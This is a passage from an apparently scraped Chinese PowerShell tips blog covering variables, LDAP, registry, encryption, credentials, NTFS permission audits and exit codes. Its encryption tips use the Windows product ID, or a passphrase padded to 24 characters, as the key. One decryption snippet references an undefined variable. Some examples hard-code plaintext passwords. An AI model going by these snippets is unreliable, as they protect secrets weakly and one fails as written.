下一个约束条件是“只读”状态。如果您确信某个变量在脚本的某一部分中不可被更改，请将它保住为只读。任何试图改变该变量的操作都会触发一个 PowerShell 异常： PS&gt; $a = 1 PS&gt; $a = 100 PS&gt; Set-Variable a -Option ReadOnly PS&gt; $a 100 PS&gt; $a = 200 Cannot overwrite variable. PS&gt; Set-Variable a -Option None -Force PS&gt; $a = 212 请注意写保护如何打开和关闭。要将写保护关闭，只需要将变量开关设为“None”，并且别忘了 -Force 开关。 如您所见，“ReadOnly”选项是一个软保护开关。您可以控制它开和关。在前一个技能中，您学到了“Constant”选项。Constant 的意思如它们的名字：常量。和“ReadOnly”不同，常量无法变回可写状态。","link":"/2015/03/26/read-only-and-strongly-typed-variables/"},{"title":"PowerShell 技能连载 - 查找只读型和常量型变量","text":"适用于 PowerShell 所有版本 有些变量是受保护且不可改变的。要查这些变量，请看如下代码： Get-Variable | Where-Object { $_.Options -like '*Constant*' -or $_.Options -like '*ReadOnly*' } | Select-Object -Property Name, Options, Description 执行的结果类似这样： Name Options Description ---- ------- ----------- ? ReadOnly, AllScope Status des letzten Befehls ConsoleFileName ReadOnly, AllScope Name der aktuellen Kons... Error Constant ExecutionContext Constant, AllScope Die für Cmdlets verfügb... false Constant, AllScope Boolean False HOME ReadOnly, AllScope Ordner mit dem Profil d... Host Constant, AllScope Ein Verweis auf den Hos... PID Constant, AllScope Aktuelle Prozess-ID PSCulture ReadOnly, AllScope Die Kultur der aktuelle... PSHOME Constant, AllScope Der übergeordnete Ordne... psISE Constant PSUICulture ReadOnly, AllScope Die Benutzeroberflächen... psUnsupportedConsoleAppl... Constant PSVersionTable Constant, AllScope Versionsinformationen f... ShellId Constant, AllScope &quot;ShellID&quot; gibt die aktu... true Constant, AllScope Boolean True 有意思的地方是如何用 Where-Object 来过滤这些变量。这段代码使用了字符串对比和 -like。这是因为变量选项是各种标志，并且标志可以组合使用。通过使用 -like 和占位符，您可以基本安全地用您希望的标志来过滤，即便设置了其它标志。","link":"/2015/03/27/finding-read-only-and-constant-variables/"},{"title":"PowerShell 技能连载 - 访问非 Microsoft LDAP 服务","text":"适用于 PowerShell 所有版本 Microsoft 和 Dell 提供了一些 Active Directory 的免费 cmdlet，分别是 RSAT 工具和 Quest 的一部分。它们使访问域控制器变得更简单。 要访问一个非 Microsoft 的 LDAP 服务器，由于没有现成的 cmdlet，所以可以使用 .NET 框架的功能。 以下是一些示例代码，演示了如何连接这种 LDAP 服务器，提交 LDAP 查询，并且获取信息。 该脚本假设 LDAP 服务器架设在 192.168.1.1 的 389 端口，是“mycompany.com”域的一部分，有一个名为“SomeGroup”的工作组。该脚本列出该工作组的用户账户： $LDAPDirectoryService = '192.168.1.1:389' $DomainDN = 'dc=mycompany,dc=com' $LDAPFilter = '(&amp;(cn=SomeGroup))' $null = [System.Reflection.Assembly]::LoadWithPartialName('System.DirectoryServices.Protocols') $null = [System.Reflection.Assembly]::LoadWithPartialName('System.Net') $LDAPServer = New-Object System.DirectoryServices.Protocols.LdapConnection $LDAPDirectoryService $LDAPServer.AuthType = [System.DirectoryServices.Protocols.AuthType]::Anonymous $LDAPServer.SessionOptions.ProtocolVersion = 3 $LDAPServer.SessionOptions.SecureSocketLayer =$false $Scope = [System.DirectoryServices.Protocols.SearchScope]::Subtree $AttributeList = @('*') $SearchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest -ArgumentList $DomainDN,$LDAPFilter,$Scope,$AttributeList $groups = $LDAPServer.SendRequest($SearchRequest) foreach ($group in $groups.Entries) { $users=$group.attributes['memberUid'].GetValues('string') foreach ($user in $users) { Write-Host $user } }","link":"/2015/03/30/accessing-non-microsoft-ldap-servers/"},{"title":"PowerShell 技能连载 - ISE 自动完成技巧","text":"适用于 PowerShell 3.0 ISE 及以上版本 当您希望选择某个 cmdlet 返回的信息时，通常使用的是 Select-Object： Get-Process | Select-Object -Property Name, Company, Description 然而，您需要手工键入希望显示的属性名。当您键入“-Property”之后并不会弹出智能提示。 一个不为人知的技巧是按下 CTRL+SPACE 来手动显示智能提示菜单。如您所见，PowerShell 会开心地提供所有属性的列表，前提是上一级的 cmdlet 定义了输出的类型。 要选择多余一个属性，在键入逗号之后，再次按下 CTRL+SPACE 即可。","link":"/2015/03/31/ise-auto-completion-trick/"},{"title":"PowerShell 技能连载 - 发现高影响级别 cmdlet","text":"适用于 PowerShell 所有版本 cmdlet 可以定义它们的影响力有多大。通常，那些会对系统造成不可恢复影响的 cmdlet 的“影响级别”设置为“高”。 当您运行这样一个 cmdlet 时，PowerShell 将会弹出一个确认对话框，防止您不小心误操作。确认对话框也能防止您在无人值守的情况下运行这些 cmdlet。 要查看 cmdlet 的“影响级别”为多高，可以用这段代码输出该信息： Get-Command -CommandType Cmdlet | ForEach-Object { $type = $_.ImplementingType if ($type -ne $null) { $type.GetCustomAttributes($true) | Where-Object { $_.VerbName -ne $null } | Select-Object @{Name='Name'; Expression={'{0}-{1}' -f $_.VerbName, $_.NounName}}, ConfirmImpact } } | Sort-Object ConfirmImpact -Descending 要只查看影响级别为“高”的 cmdlet，只需要加一个过滤器： Get-Command -CommandType Cmdlet | ForEach-Object { $type = $_.ImplementingType if ($type -ne $null) { $type.GetCustomAttributes($true) | Where-Object { $_.VerbName -ne $null } | Select-Object @{Name='Name'; Expression={'{0}-{1}' -f $_.VerbName, $_.NounName}}, ConfirmImpact } } | Sort-Object ConfirmImpact -Descending | Where-Object { $_.ConfirmImpact -eq 'High' } 要以无人值守的方式运行这些 cmdlet 并且不让自动提示框出现，请加上 -Confirm:$False 参数。","link":"/2015/04/01/discovering-high-impact-cmdlets/"},{"title":"PowerShell 技能连载 - 智能参数验证","text":"适用于 PowerShell 2.0 及以上版本 当您用 PowerShell 创建带参数的函数时，请明确地告知 PowerShell 该参数的类型。 这是一个简单的例子，您需要输入一个星期数： function Get-Weekday { param ( $Weekday ) &quot;You chose $Weekday&quot; } 用户可以传入任何东西，不仅是正常的星期数： PS&gt; Get-Weekday -Weekday NoWeekday You chose NoWeekday 有些时候，您可能会看到用正则表达式实现的验证器： function Get-Weekday { param ( [ValidatePattern('Monday|Tuesday|Wednesday|Thursday|Friday|Saturday|Sunday')] $Weekday ) &quot;You chose $Weekday&quot; } 现在，用户的输入被限定在了这些模式中，如果输入的值不符合正则表达式的模式，PowerShell 将会抛出一个异常。然而，错误信息并不是很有用，并且用户输入的时候并不能享受到智能提示的便利。 一个更好的方法是使用验证集合： function Get-Weekday { param ( [ValidateSet('Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday', 'Sunday')] $Weekday ) &quot;You chose $Weekday&quot; } 现在，用户只能输入您允许的值，并且用户在 PowerShell ISE 中输入的时候会获得智能提示信息，显示允许输入的值。 如果您了解您期望值对应的 .NET 的枚举类型，那么可以更简单地将该类型绑定到参数上： function Get-Weekday { param ( [System.DayOfWeek] $Weekday ) &quot;You chose $Weekday&quot; }","link":"/2015/04/02/clever-parameter-validation/"},{"title":"PowerShell 技能连载 - 查找 Exchange 邮箱","text":"适用于 Microsoft Exchange 2013 要查看邮箱的个数，只需要使用 Exchange cmdlet 并且用 Measure-Object 来统计结果： Get-Mailbox –ResultSize Unlimited | Measure-Object | Select-Object -ExpandProperty Count 类似地，要查看所有共享的邮箱，使用这段代码： Get-Mailbox –ResultSize Unlimited -RecipientTypeDetails SharedMailbox | Measure-Object | Select-Object -ExpandProperty Count 若要只查看用户邮箱，需要稍微调整一下： Get-Mailbox –ResultSize Unlimited -RecipientTypeDetails UserMailbox | Measure-Object | Select-Object -ExpandProperty Count","link":"/2015/04/03/finding-exchange-mailboxes/"},{"title":"PowerShell 技能连载 - 用 Windows 加密信息","text":"适用于 PowerShell 3.0 及以上版本 要存储机密信息，您可以使用 SecureString 对象将其保存到磁盘上。PowerShell 自动使用用户账户作为密钥，所以只有保存该信息的用户可以读取它。 如果您希望该机密信息不绑定到特定的用户，而是绑定到某台机器，您可以使用 Windows 产品序列号作为密钥。请注意这并不是特别安全，因为密钥在 Windows 注册表中时公开可见的。它还有个使用前提是 Windows 是使用合法产品序列号安装的。 以下这段代码接受任意文本信息，然后用 Windows 产品序列号对它进行加密并保存到磁盘上： $Path = &quot;$env:temp\\secret.txt&quot; $Secret = 'Hello World!' $regKey = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name DigitalProductID $encryptionKey = $regKey.DigitalProductID $Secret | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString -Key ($encryptionKey[0..23]) | Out-File -FilePath $Path notepad $Path 这是对加密的文本进行解密的代码： $Path = &quot;$env:temp\\secret.txt&quot; $regKey = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name DigitalProductID $encryptionKey = $regKey.DigitalProductID $decryptedTextSecureString = Get-Content -Path $Path -Raw | ConvertTo-SecureString -Key ($secureKey[0..23]) $cred = New-Object -TypeName System.Management.Automation.PSCredential('dummy', $decryptedTextSecureString) $decryptedText = $cred.GetNetworkCredential().Password &quot;The decrypted secret text: $decryptedText&quot; 请注意如何 PSCredential 对象来对密文进行解密并还原出明文的。","link":"/2015/04/06/encrypting-information-with-windows-productid/"},{"title":"PowerShell 技能连载 - 用口令对文本信息加密","text":"适用于 PowerShell 3.0 及以上版本 在前一个技能中，我们介绍了如何使用 Windows 注册表中的 Windows 产品序列号来加密文本信息。 如果您觉得这种方式不够安全，那么可以使用自己指定的密钥来加密。以下例子演示了如何使用密码作为加密密钥： $Path = &quot;$env:temp\\secret.txt&quot; $Secret = 'Hello World!' $Passphrase = 'Some secret key' $key = [Byte[]]($Passphrase.PadRight(24).Substring(0,24).ToCharArray()) $Secret | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString -Key $key | Out-File -FilePath $Path notepad $Path 要解密一段密文，您需要知道对应的密码： $Passphrase = Read-Host 'Enter the secret pass phrase' $Path = &quot;$env:temp\\secret.txt&quot; $key = [Byte[]]($Passphrase.PadRight(24).Substring(0,24).ToCharArray()) try { $decryptedTextSecureString = Get-Content -Path $Path -Raw | ConvertTo-SecureString -Key $key -ErrorAction Stop $cred = New-Object -TypeName System.Management.Automation.PSCredential('dummy', $decryptedTextSecureString) $decryptedText = $cred.GetNetworkCredential().Password } catch { $decryptedText = '(wrong key)' } &quot;The decrypted secret text: $decryptedText&quot;","link":"/2015/04/07/encrypting-text-information-using-passphrase/"},{"title":"PowerShell 技能连载 - 查找所有活动的驱动器号","text":"要快速地获取所有驱动器号，请使用以下代码： #requires -Version 1 [Environment]::GetLogicalDrives() 执行结果是所有活动的驱动器号： PS&gt; C:\\ D:\\ E:\\ F:\\ G:\\","link":"/2015/04/08/find-all-active-drive-letters/"},{"title":"PowerShell 技能连载 - 对密码加密","text":"如果您确实需要在脚本中保存一个凭据对象，以下是将一个安全字符串转换为加密文本的方法： $password = Read-Host -Prompt 'Enter Password' -AsSecureString $encrypted = $password | ConvertFrom-SecureString $encrypted | clip.exe $encrypted 当运行这段代码时，会要求您输入密码。接下来密码会被转换为一系列字符并存入剪贴板中。加密的密钥是您的身份标识加上您的机器标识，所以只能用相同机器的相同用户对密码解密。 下一步，用这段代码可以将您的密码密文转换为凭据对象： $secret = '01000000d08c9ddf0115d1118c7a00c04fc297eb01000000d4a6c6bfcbbb75418de6e9672d85e73600...996f8365c8c82ea61f94927d3e3b14000000c6aecec683717376f0fb18519f326f6ac9cd89dc' $username = 'test\\user' $password = $secret | ConvertTo-SecureString $credential = New-Object -TypeName System.Management.Automation.PSCredential($username, $password) # example call Start-Process notepad -Credential $credential -WorkingDirectory c:\\ 将加密的密码字符串写入脚本中，然后使用指定的用户名来验证身份。 现在，$cred 中保存的凭据对象可以在任何支持 -Credential 参数的 cmdlet 或函数中使用了。","link":"/2015/04/09/encoded-passwords/"},{"title":"PowerShell 技能连载 - 批量重命名文件","text":"假设您有一整个文件夹的图片文件，并希望它们的名字标准化。 这个脚本演示了如何批量重命名图片文件： $i = 0 Get-ChildItem -Path c:\\pictures -Filter *.jpg | ForEach-Object { $extension = $_.Extension $newName = 'pic_{0:d6}{1}' -f $i, $extension $i++ Rename-Item -Path $_.FullName -NewName $newName } 文件夹中所有的 JPG 文件都被重命名了。新的文件名是“pic_”加上四位数字。 您可以很容易地修改脚本来重命名其它类型的文件，或是使用其它文件名模板。","link":"/2015/04/10/bulk-re-naming-files/"},{"title":"PowerShell 技能连载 - 比较文件夹内容","text":"要快速比较文件夹内容并且找出只在一个文件夹中存在的文件，请试试以下代码： $list1 = Get-ChildItem c:\\Windows\\system32 | Sort-Object -Property Name $list2 = Get-ChildItem \\\\server12\\c$\\windows\\system32 | Sort-Object -Property Name Compare-Object -ReferenceObject $list1 -DifferenceObject $list2 -Property Name | Sort-Object -Property Name 该代码属两个文件夹列表，一个来自本机，另一个来自远程计算机。接下来 Compare-Object 命令会挑出只在一个文件夹中存在的文件。","link":"/2015/04/13/comparing-folder-content/"},{"title":"PowerShell 技能连载 - 查找电视剧信息","text":"PowerShell 可以查询基于 XML 内容的网站，以下是一个查询电影数据库的例子： 只需要输入您感兴趣的电视剧名称即可。如果您不能直接访问 Internet，可以用 -Proxy 参数指定代理服务器。 #requires -Version 3 $name = 'stargate' $url = &quot;http://thetvdb.com/api/GetSeries.php?seriesname=$name&amp;language=en&quot; $page = Invoke-WebRequest -Uri $url &lt;#-Proxy 'http://proxy....:8080' -ProxyUseDefaultCredentials#&gt; $content = $page.Content $xml = [XML]$content $xml.Data.Series | Out-GridView","link":"/2015/04/14/finding-information-about-tv-series/"},{"title":"ionic 问答","text":"Q: 使用 CSS 还是 ion- 指令A: Ion vs div directives - Ionic CSS 优势： 性能 DOM 干净 ion- 指令优势： 功能更强，例如 ion-list 的 show-reorder 等 API 结论：只是要样式，用 CSS需要增强的 API 功能，用 ion- 指令。","link":"/2015/04/14/ionic-qa/"},{"title":"PowerShell 技能连载 - 读取注册表键值和值类型","text":"Get-ItemProperty 可以方便地读取注册表键值，但是无法获得注册表键值的数据类型。 Get-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion' 以下是通过 .NET 方法的另一种实现，可以获得所有的信息： PS&gt; Get-RegistryValue 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion' Name Type Value ---- ---- ----- CurrentVersion String 6.1 CurrentBuild String 7601 SoftwareType String System CurrentType String Multiprocessor Free InstallDate DWord 1326015519 RegisteredOrganization String RegisteredOwner String Tobias SystemRoot String C:\\Windows InstallationType String Client EditionID String Ultimate ProductName String Windows 7 Ultimate ProductId String 0042xxx657 DigitalProductId Binary {164, 0, 0, 0...} DigitalProductId4 Binary {248, 4, 0, 0...} CurrentBuildNumber String 7601 BuildLab String 7601.win7sp1_gdr.150202-1526 BuildLabEx String 7601.18741.amd64fre.win7sp1_gdr.150202-1526 BuildGUID String f974f16b-3e62-4136-a6fb-64fccddecde3 CSDBuildNumber String 1130 PathName String C:\\Windows 我们需要开发一个 Get-RegistryValue 函数来实现该功能。请注意该函数可传入任意合法的注册表键，并且不需要使用 PowerShell 驱动器号。 function Get-RegistryValue { param ( [Parameter(Mandatory = $true)] $RegistryKey ) $key = Get-Item -Path &quot;Registry::$RegistryKey&quot; $key.GetValueNames() | ForEach-Object { $name = $_ $rv = 1 | Select-Object -Property Name, Type, Value $rv.Name = $name $rv.Type = $key.GetValueKind($name) $rv.Value = $key.GetValue($name) $rv } }","link":"/2015/04/15/getting-registry-values-and-value-types/"},{"title":"PowerShell 技能连载 - 读取 RSS 频道","text":"我们可以通过 XML 对象来读取 RSS 频道信息，然而 XML 对象不支持代理服务器。 这个例子用 Invoke-WebRequest 通过代理服务器来获取 RSS 数据（如果忽略 -Proxy 参数则直接获取），然后将结果转换为 XML。 #requires -Version 3 $url = 'http://blogs.msdn.com/b/powershell/rss.aspx' $page = Invoke-WebRequest -Uri $url &lt;#-Proxy 'http://proxy...:8080' -ProxyUseDefaultCredentials#&gt; $content = $page.Content $xml = [XML]$content $xml.rss.channel.item | Out-GridView 这段代码将显示 PowerShell 团队博客数据。","link":"/2015/04/16/reading-rss-feeds/"},{"title":"PowerShell 技能连载 - 使用 Splatting 技术","text":"通过 splatting 技术，您可以调用 cmdlet，并可以控制提交的参数。 要实现该目标，先向一个哈希表插入参数和值，然后将哈希表传给 cmdlet。这种方法适用于任意 cmdlet。 以下是一个例子： # classic: Get-ChildItem -Path c:\\windows -Filter *.ps1 -Recurse -ErrorAction SilentlyContinue # Splatting $params = @{} $params.Path = 'c:\\windows' $params.Filter = '*.ps1' $params.Recurse = $true $params.ErrorAction = 'SilentlyContinue' Get-ChildItem @params","link":"/2015/04/17/using-splatting/"},{"title":"PowerShell 技能连载 - 安全使用 UNC 路径","text":"当您在 PowerShell 中使用 UNC 路径时，您的脚本可能会中断。由于 UNC 路径没有驱动器号，所以 PowerShell 将会在当前目录下查找，并且使用当前路径对应的 PSProvider。 所以如果您的当前目录不是一个文件路径（例如是一个注册表驱动器），那么您的 UNC 路径将会被解释成一个注册表路径。 要安全地使用路径，请一定在 UNC 路径前面加上正确的提供器名称： # UNC-Paths have no drive letter # so PowerShell uses the current directory instead to find the PSProvider # for UNC paths, to be safe, always add the provider name manually $exists = Test-Path -Path 'FileSystem::\\\\server12\\fileshare' $exists","link":"/2015/04/20/safely-use-unc-paths/"},{"title":"PowerShell 技能连载 - 验证域凭据","text":"要通过当前的域验证凭据（用户名和密码），您可以使用这段代码： #requires -Version 1 $username = 'test\\user' $password = 'topSecret' $root = &quot;LDAP://&quot; + ([ADSI]&quot;&quot;).distinguishedName $Domain = New-Object System.DirectoryServices.DirectoryEntry($root, $username, $password) if ($Domain.Name -eq $null) { Write-Warning 'Credentials incorrect, or computer is not a domain member.' } else { Write-Host 'Credentials accepted.' } 总的来说，该脚本首先确认当前域名，然后用提供的凭据来获取根元素。 如果该操作成功完成，说明凭据时合法的。如果失败，说明凭据是无效的，或者该计算机根本没有加入域。","link":"/2015/04/21/validating-domain-credentials/"},{"title":"PowerShell 技能连载 - 获取当前 IP 地址","text":"以下是一段您计算机绑定的所有 IP 地址的代码： #requires -Version 1 $ipaddress = [System.Net.DNS]::GetHostByName($null) Foreach ($ip in $ipaddress.AddressList) { $ip.IPAddressToString } 如果您将 $null 替换为主机名（例如“_server123_”），就可以获取对应计算机绑定的 IP 地址。 如果您只需要获取 IPv4 地址，请试试这段代码： #requires -Version 1 $ipaddress = [System.Net.DNS]::GetHostByName($null) foreach($ip in $ipaddress.AddressList) { if ($ip.AddressFamily -eq 'InterNetwork') { $ip.IPAddressToString } }","link":"/2015/04/22/get-current-ip-address/"},{"title":"PowerShell 技能连载 - 获取 IP 地址的地理信息","text":"您希望知道某个公网 IP 地址位于什么地方吗？假设您有 Internet 连接，您可以查询公共信息服务来获得。 这个例子将获取某个 IP 地址的地理信息。请确认您将示例 IP 地址替换为了实际存在的公网 IP 地址。请打开类似 https://www.whatismyip.com/ 这样的网站来查看您自己的 IP 地址。如果您使用的是一个内网 IP 地址，该 WEB 服务将无法准确地报告地理信息数据。 #requires -Version 3 $ipaddress = '93.212.237.11' $infoService = &quot;http://freegeoip.net/xml/$ipaddress&quot; $geoip = Invoke-RestMethod -Method Get -URI $infoService $geoip.Response","link":"/2015/04/23/get-ip-address-geolocation/"},{"title":"PowerShell 技能连载 - 检测危险的 NTFS 权限","text":"以下是一个查找潜在危险的 NTFS 权限的快速简单的方法。这段脚本检测所有 $pathsToCheck 的文件夹并且汇报错有具有 $dangerousBitMask 中定义的文件系统标志的安全存取控制项（译者注：也就是“路径”）。 在这个例子中，该脚本从您的 %PATH% 环境变量中得到所有查找到的路径。这些路径是高风险的，需要用 NTFS 权限来保护，只能由 Administrators 和 system 拥有写权限。 软件安装程序常常将它们自身加入环境变量而没有正确地保护它们所加入的文件夹权限。这将增加安全风险。以下脚本将检查这些地方并找出哪些有潜在危险的 NTFS 存取权限供您做决定。 # list of paths to check for dangerous NTFS permissions $pathsToCheck = $env:Path -split ';' # these are the bits to watch for # if *any* one of these is set, the folder is reported $dangerousBitsMask = '011010000000101010110' $dangerousBits = [Convert]::ToInt64($dangerousBitsMask, 2) # check all paths... $pathsToCheck | ForEach-Object { $path = $_ # ...get NTFS security descriptor... $acl = Get-Acl -Path $path # ...check for any &quot;dangerous&quot; access right $acl.Access | Where-Object { $_.AccessControlType -eq 'Allow' } | Where-Object { ($_.FileSystemRights -band $dangerousBits) -ne 0 } | ForEach-Object { # ...append path information, and display filesystem rights as bitmask $ace = $_ $bitmask = ('0' * 64) + [Convert]::toString([int]$ace.FileSystemRights, 2) $bitmask = $bitmask.Substring($bitmask.length - 64) $ace | Add-Member -MemberType NoteProperty -Name Path -Value $path -PassThru | Add-Member -MemberType NoteProperty -Name Rights -Value $bitmask -PassThru } } | Sort-Object -Property IdentityReference | Select-Object -Property IdentityReference, Path, Rights, FileSystemRights | Out-GridView","link":"/2015/04/24/identifying-risky-ntfs-permissions/"},{"title":"PowerShell 技能连载 - 理解 break、continue、return 和 exit 语句","text":"您是否十分熟悉“break”、“continue”、“return”和“exit”的用法？这些是十分有用的语言概念，以下是一个演示它们不同之处的测试函数： 'Starting' function Test-Function { $fishtank = 1..10 Foreach ($fish in $fishtank) { if ($fish -eq 7) { break # &lt;- abort loop #continue # &lt;- skip just this iteration, but continue loop #return # &lt;- abort code, and continue in caller scope #exit # &lt;- abort code at caller scope } &quot;fishing fish #$fish&quot; } 'Done.' } Test-Function 'Script done!' 只需要去掉某个关键词的注释并运行脚本，就可以观察循环的执行结果。","link":"/2015/04/27/understanding-break-continue-return-and-exit/"},{"title":"PowerShell 技能连载 - 为什么“exit”将会关掉 PowerShell","text":"某些时候，我们会误会“exit”语句的工作方式。以下是一个例子： function abc { 'Start' exit 100 'Done' } abc 当您运行这个脚本时，abc 函数会被调用，然后退出。您会见到“Start”提示，但见不到“Done”提示，并且 $LASTEXITCODE 变量的值为 100。但这是实际情况吗？ 当您在交互式的 PowerShell 控制台以交互式的方式运行 abc 方式时，该函数仍然退出了，不过这次，PowerShell 也被关闭了。为什么呢？ “Exit”在调用者作用域中退出代码。当您运行一个脚本时，该脚本退出后 PowerShell 仍然继续运行。当您以交互式的方式执行该函数时，交互式的 PowerShell 作为全局作用域退出了，而且由于不存在更高层的作用域了，所以 PowerShell 关闭了。 要更明显一点体现这个观点，我们在上述示例脚本中增加一点内容： function abc { 'Start' exit 100 'Done' } 'Function starts' abc 'Function ends' 如您所发现的，“exit”实际上并不是退出 abc 函数，而是退出整个脚本。所以您既见不到“Done”字样也见不到“Function ends”字样。 所以请慎用“exit”语句！它只能用在退出一个脚本并将控制权交还给调用者的时候。","link":"/2015/04/28/why-quot-exit-quot-can-kill-powershell/"},{"title":"PowerShell 技能连载 - 从 PowerShell 脚本中接收错误返回值","text":"以下是一个演示 PowerShell 如何返回一个数值型状态码给调用者的简单脚本： $exitcode = 123 $p = Start-Process -FilePath powershell -ArgumentList &quot;-command get-process; exit $exitcode&quot; -PassThru Wait-Process -Id $p.Id 'External Script ended with exit code ' + $p.ExitCode 如果您在 PowerShell 中直接调用该脚本（不使用 Start-Process），那么数值型返回值会被赋给 $LASTEXITCODE： $exitcode = 199 powershell.exe &quot;get-process; exit $exitcode&quot; 'External Script ended with exit code ' + $LASTEXITCODE 如果您从一个批处理文件或是 VBScript 中运行一段 PowerShell 脚本，该数值型返回值将会赋给 %ERRORLEVEL% 环境变量，好比 PowerShell 是一个控制台应用程序一样——实际上 powershell.exe 确实是。","link":"/2015/04/29/receiving-error-level-from-powershell-script/"},{"title":"PowerShell 技能连载 - 移除空白（和换行）","text":"您也许知道每个 string 对象都有个 Trim() 方法可以删除该字符串开头和结尾的空白： $text = ' Hello ' $text.Trim() 一个鲜为人知的事实是，Trim() 也会删掉开头和结尾的换行： $text = ' Hello ' $text.Trim() 如果您需要，您可以控制 Trim() 函数吃掉的字符。 这个例子删除空格、点号、减号和换行： $text = ' ... Hello ...--- ' $text.Trim(&quot; .-`t`n`r&quot;)","link":"/2015/04/30/removing-whitespace-and-line-breaks/"},{"title":"PowerShell 技能连载 - 禁止更新后自动重启","text":"您是否厌烦了 Windows 安装了一些更新后导致的非计划中的重启？ 和其它情况类似，您可以通过组策略控制重启，而且多数组策略设置只是注册表键而已。以下是一个通过设置注册表键来实现控制安装更新后的重启设置的示例脚本： $code = { $key = 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU' $name = 'NoAutoRebootWithLoggedOnUsers' $type = 'DWord' $value = 1 if (!(Test-Path -Path $key)) { $null = New-Item -Path $key -Force } Set-ItemProperty -Path $key -Name $name -Value $value -Type $type } Start-Process -FilePath powershell.exe -ArgumentList $code -Verb runas -WorkingDirectory c:\\ 请注意该脚本如何操作注册表：它实际上是通过另一个 PowerShell 实例间接执行的。第二个实例是通过 Start-Process 启动的，而“-Verb Runas”确保了以管理员身份运行这段代码。 如果您当前没有管理员权限，那么会弹出提升权限的对话框供您选择使用管理员权限，或是如果您的账户没有管理员权限的时候要求您选择一个有权限的账户。","link":"/2015/05/01/disable-automatic-reboot-after-update/"},{"title":"PowerShell 技能连载 - 谁在使用网络资源？","text":"假设您拥有管理员权限，您可以使用一个简单的 WMI 类来检测某人是否正在通过网络访问您的资源： PS&gt; Get-WmiObject -Class Win32_ServerConnection | Select-Object -Property ComputerName, ConnectionID, UserName, ShareName 这个操作也可以远程执行：只需要为 Get-WmiObject 命令增加 -ComputerName 参数即可查看谁在访问该远程计算机上的共享资源。需要拥有目标计算机的管理员权限才可以进行远程操作。","link":"/2015/05/04/who-is-accessing-network-resources/"},{"title":"PowerShell 技能连载 - 将 CSV 转换为 Excel 文件","text":"PowerShell 可以用 Export-Csv 很容易创建 CSV 文件。如果您的系统中安装了 Microsoft Excel，PowerShell 可以调用 Excel 将一个 CSV 文件转换为一个 XLSX Excel 文件。 以下是一段示例代码。它使用 Get-Process 来获取一些数据，然后将数据写入一个 CSV 文件。Export-Csv 使用 -UseCulture 来确保 CSV 文件使用您所安装的 Excel 期望的分隔符。 $FileName = &quot;$env:temp\\Report&quot; # create some CSV data Get-Process | Export-Csv -UseCulture -Path &quot;$FileName.csv&quot; -NoTypeInformation -Encoding UTF8 # load into Excel $excel = New-Object -ComObject Excel.Application $excel.Visible = $true $excel.Workbooks.Open(&quot;$FileName.csv&quot;).SaveAs(&quot;$FileName.xlsx&quot;,51) $excel.Quit() explorer.exe &quot;/Select,$FileName.xlsx&quot; 下一步，Excel 打开该 CSV 文件，然后将数据保存为一个 XLSX 文件。 它工作得很好，不过可能会遇到一个类似这样的异常： PS&gt; $excel.Workbooks.Open(&quot;$FileName.csv&quot;) Exception calling &quot;Open&quot; with &quot;1&quot; argument(s): &quot;Old format or invalid type library. (Exception from HRESULT: 0x80028018 (TYPE_E_INVDATAREAD))&quot; At line:1 char:1 + $excel.Workbooks.Open(&quot;$FileName.csv&quot;) + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [], MethodInvocationException + FullyQualifiedErrorId : ComMethodTargetInvocation 这是一个长期已知的问题。当您的 Excel 语言和您的 Windows 操作系统不一致时可能会碰到。当您的 Windows 操作系统使用一个本地化的 MUI 包时，也许根本不会遇到这个问题。 要解决这个问题，您可以临时改变该线程的语言文化设置来适应您的 Excel 版本： $FileName = &quot;$env:temp\\Report&quot; # create some CSV data Get-Process | Export-Csv -Path &quot;$FileName.csv&quot; -NoTypeInformation -Encoding UTF8 # load into Excel $excel = New-Object -ComObject Excel.Application $excel.Visible = $true # change thread culture [System.Threading.Thread]::CurrentThread.CurrentCulture = 'en-US' $excel.Workbooks.Open(&quot;$FileName.csv&quot;).SaveAs(&quot;$FileName.xlsx&quot;,51) $excel.Quit() explorer.exe &quot;/Select,$FileName.xlsx&quot; 这也会带来另外一个问题：当您以 en-US 语言文化设置运行 Excel 的 Open() 方法时，它不再需要 CSV 文件使用您的本地化分隔符。现在它需要的是一个以半角逗号分隔的文件，所以第二个脚本去掉了 -UseCulture 设置。","link":"/2015/05/05/converting-csv-to-excel-file/"},{"title":"PowerShell 技能连载 - 面向管理员的免费 PowerShell 模块","text":"上个技能中我们收到一个反馈，推荐使用一个名为“Carbon”的免费 PowerShell 模块，其中包含了一大堆有用的 PowerShell 函数。 其中一个是 Get-IPAddress，它能返回您计算机的所有 IP 地址。您可以在这儿找到和下载该模块：http://get-carbon.org/。 请始终记着：从外部资源中下载 PowerShell 代码要记得检查一遍代码，确保是您所需要的内容。","link":"/2015/05/06/free-powershell-module-for-admins/"},{"title":"PowerShell 技能连载 - 向管道传递一个数组","text":"如果一个函数返回多于一个值，PowerShell 会将它们封装为一个数组。然而如果您通过管道将它传递至另一个函数，该管道会自动地将数组“解封”，并且一次处理一个数组元素。 如果您需要原原本本地处理一个数组而不希望解封，那么请将返回值封装在另一个数组中。通过这种方式，管道会将外层的数组解封并处理内层的数组。 以下代码演示了这个技能： #requires -Version 1 function Test-ArrayAsReturnValue1 { param($count) $array = 1..$count return $array } function Test-ArrayAsReturnValue2 { param($count) $array = 1..$count return ,$array } 'Result 1:' Test-ArrayAsReturnValue1 -count 10 | ForEach-Object -Process { $_.GetType().FullName } 'Result 2:' Test-ArrayAsReturnValue2 -count 10 | ForEach-Object -Process { $_.GetType().FullName } 当您运行这段代码时，第一个例子将返回数组中的元素。第二个例子将会把整个数组传递给循环。 PS C:\\&gt; Result 1: System.Int32 System.Int32 System.Int32 System.Int32 System.Int32 System.Int32 System.Int32 System.Int32 System.Int32 System.Int32 Result 2: System.Object[]","link":"/2015/05/07/passing-arrays-to-pipeline/"},{"title":"PowerShell 技能连载 - 